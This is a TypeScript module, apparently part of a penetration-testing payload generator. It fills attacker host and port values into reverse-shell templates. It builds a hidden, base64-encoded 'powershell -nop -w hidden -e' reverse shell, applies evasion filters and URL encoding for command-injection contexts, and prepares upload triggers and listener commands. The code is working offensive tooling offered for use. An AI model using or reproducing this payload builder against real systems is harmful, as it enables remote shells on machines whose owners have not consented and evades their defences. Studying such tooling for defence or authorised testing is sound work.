import { urlEncodeShell, utf16leBase64 } from "./encode";
import { wrapForContext, type PasteContext } from "./context";
import { applyFilter, FILTER_CONTEXTS, filterFitsOs, type FilterId } from "./filters";
import { fillListener, LISTENERS } from "./listeners";
import { POWERSHELL_TCP } from "./psScripts";
import type { BuiltPayload, ListenerId, PayloadDef } from "./types";

const PLACEHOLDER = /\{([A-Z][A-Z0-9_]*)\}/g;
/** The web server for a served file: 80, or 8000 when the listener takes 80, so the two never clash. */
const ALT_SERVE_PORT = "8000";

/**
 * Tokens worked out from the others, never typed and never unresolved themselves: SERVE_PORT (the web server's port),
 * WEB_PORT (":8000" in the cradle URL when the server moved off 80, else nothing) and PS_B64 (UTF-16LE base64 of
 * POWERSHELL_TCP with LHOST and LPORT filled; while either is blank it stays {PS_B64} and that one is unresolved).
 */
export const DERIVED_TOKENS = new Set(["SERVE_PORT", "WEB_PORT", "PS_B64"]);

/** Trimmed from both ends of UPLOAD_PATH, so "/uploads/" and "uploads" fill the same. */
const trimPath = (p: string) => p.replace(/^[\s/]+|[\s/]+$/g, "");

export interface BuildOptions {
  /** The OS a def with os "any" is wrapped for (default linux). */
  os?: "linux" | "windows";
  /** Used when it is in def.listeners; otherwise def.listeners[0]. */
  listener?: ListenerId;
  /**
   * Wraps the filled payload (filters.ts) instead of the context's bash -c step, then URL-encodes it in a URL context.
   * Ignored outside FILTER_CONTEXTS, for the other OS, and while anything is unresolved.
   */
  filter?: FilterId;
}

/** Fills the placeholders and wraps the result so it works as pasted in `ctx`. */
export function buildPayload(
  def: PayloadDef, ctx: PasteContext, values: Record<string, string>, opts: BuildOptions = {},
): BuiltPayload {
  const value = (name: string): string | null => {
    const given = (values[name] ?? "").trim();
    let v = given !== "" ? given : (def.defaults?.[name] ?? "").trim();
    if (name === "UPLOAD_PATH") v = trimPath(v);
    return v === "" ? null : v;
  };
  const lhost = value("LHOST");
  const lport = value("LPORT");
  const moved = lport === "80";
  const psB64 = lhost !== null && lport !== null
    ? utf16leBase64(POWERSHELL_TCP.replace("{LHOST}", lhost).replace("{LPORT}", lport))
    : null;
  const derived: Record<string, string> = { SERVE_PORT: moved ? ALT_SERVE_PORT : "80", WEB_PORT: moved ? `:${ALT_SERVE_PORT}` : "" };
  const filler = (unresolved: string[]) => {
    const miss = (name: string) => { if (!unresolved.includes(name)) unresolved.push(name); };
    return (template: string) => template.replace(PLACEHOLDER, (m, name: string) => {
      if (name === "PS_B64") {
        if (psB64 !== null) return psB64;
        if (lhost === null) miss("LHOST");
        if (lport === null) miss("LPORT");
        return m;
      }
      if (DERIVED_TOKENS.has(name)) return derived[name]!;
      const v = value(name);
      if (v === null) {
        miss(name);
        return m;
      }
      return v;
    });
  };
  const unresolved: string[] = [];
  const fill = filler(unresolved);
  const filled = fill(def.template);
  const prepareLines = [def.prepare, def.serve].filter((l): l is string => !!l).map(fill);
  const prepare = prepareLines.length > 0 ? prepareLines.join("\n") : null;

  let trigger: BuiltPayload["trigger"] = null;
  if (def.upload) {
    const triggerUnresolved: string[] = [];
    trigger = { text: filler(triggerUnresolved)(def.upload.trigger), unresolved: triggerUnresolved };
  }

  // Notes may name {LPORT}, {LHOST}, {TARGET_IP}, {BIND_PORT}, {FILE}, {FILE_NAME} (FILE without its folder) or
  // {FILE_STEM} (and without its extension: a WAR's context path); a blank one stays visible, like in a listener.
  const noteValues: Record<string, string> = {};
  for (const name of ["LHOST", "LPORT", "TARGET_IP", "BIND_PORT", "FILE"]) noteValues[name] = value(name) ?? "";
  noteValues.FILE_NAME = noteValues.FILE!.replace(/^.*[\\/]/, "");
  noteValues.FILE_STEM = noteValues.FILE_NAME.replace(/\.[^.]*$/, "");
  const notes: string[] = [...(def.notes ?? []), ...(def.contextNotes?.[ctx] ?? [])].map((n) => fillListener(n, noteValues));
  const os = def.os === "any" ? (opts.os ?? "linux") : def.os;
  const asked = opts.filter && opts.filter !== "off" && FILTER_CONTEXTS.includes(ctx) ? opts.filter : null;
  const filter = asked && filterFitsOs(asked, os) ? asked : null;
  // Part tokens are filled like the template, so a token follows its value (FILE renamed to nc64.exe, LHOST=…).
  const parts0 = def.parts.map((p) => ({ ...p, token: filler([])(p.token) }));
  let parts = parts0;
  let text: string;
  const setFirst = `Set ${unresolved.join(", ")} first`;
  if (unresolved.length > 0 && def.encodePowerShell) {
    // The base64 of a half-filled script would hide the gap, so the stub stays until it is set.
    text = `powershell -nop -w hidden -e <UTF-16LE base64 of the script, once ${unresolved.map((n) => `{${n}}`).join(" ")} is set>`;
    notes.push(`${setFirst}: the script is encoded and wrapped for ${ctx} once it is.`);
  } else if (unresolved.length === 0 && filter && !(filter === "ps-b64" && def.encodePowerShell)) {
    const f = applyFilter(filled, filter);
    text = ctx === "injected-linux" ? f.text : urlEncodeShell(f.text);
    // Keep only def parts whose token still shows in the filtered text (outside the encoded blob), and not ones the
    // filter explains itself, so "what each part does" describes the shown output.
    const shown = f.text.replace(/[A-Za-z0-9+/=]{16,}|(?:\\x[0-9a-f]{2})+/g, " ");
    const own = new Set(f.parts.map((p) => p.token));
    parts = [...parts0.filter((p) => shown.includes(p.token) && !own.has(p.token)), ...f.parts];
    notes.push(f.note);
    if (ctx !== "injected-linux") notes.push("Then URL-encoded (spaces as +).");
  } else {
    // Wrapped for the context even with a placeholder unfilled; a URL encoding leaves the {NAME} readable.
    const raw = def.encodePowerShell ? `powershell -nop -w hidden -e ${utf16leBase64(filled)}` : filled;
    const wrapped = wrapForContext(raw, ctx, os, unresolved);
    text = wrapped.text;
    // A file made on Kali: the text is the Kali command, so say what to do with the file it makes.
    if (def.upload?.kali && ctx === "uploaded-file") notes.push(`Upload ${value("FILE") ?? "{FILE}"} to the target, then open the trigger URL.`);
    else notes.push(...wrapped.notes);
    if (unresolved.length > 0) notes.push(`${setFirst}.`);
    if (filter && def.encodePowerShell) notes.push("Already base64 (-e).");
    else if (filter) notes.push(`Filter applies once ${unresolved.join(", ")} ${unresolved.length > 1 ? "are" : "is"} set.`);
    // A filter picked while the OS is unknown can be for the other OS than this payload's: say it is off here.
    else if (asked) notes.push(`Filter is for ${asked === "ps-b64" ? "Windows" : "Linux"} payloads: not applied.`);
  }
  if (def.bakesIp) {
    notes.push(def.upload?.kali
      ? `LHOST and LPORT are baked into ${value("FILE") ?? "{FILE}"}: make it again and upload it again if either changes.`
      : "LHOST and LPORT are baked into the served script: regenerate it if either changes.");
  }

  const listenerId = opts.listener && def.listeners.includes(opts.listener) ? opts.listener : (def.listeners[0] ?? null);
  let listener: string | null = null;
  let listenerHeading: BuiltPayload["listenerHeading"] = "Listener";
  if (listenerId) {
    const l = LISTENERS[listenerId];
    const lv: Record<string, string> = {};
    for (const name of ["LHOST", "LPORT", "TARGET_IP", "BIND_PORT"]) lv[name] = value(name) ?? "";
    lv.MSF_PAYLOAD = def.msfPayload ?? "";
    listener = fillListener(l.template, lv);
    if (l.connect) listenerHeading = "Connect from Kali";
    if (l.note) notes.push(fillListener(l.note, lv));
  }
  return { def, text, listener, listenerId, listenerHeading, trigger, parts, notes, unresolved, prepare };
}
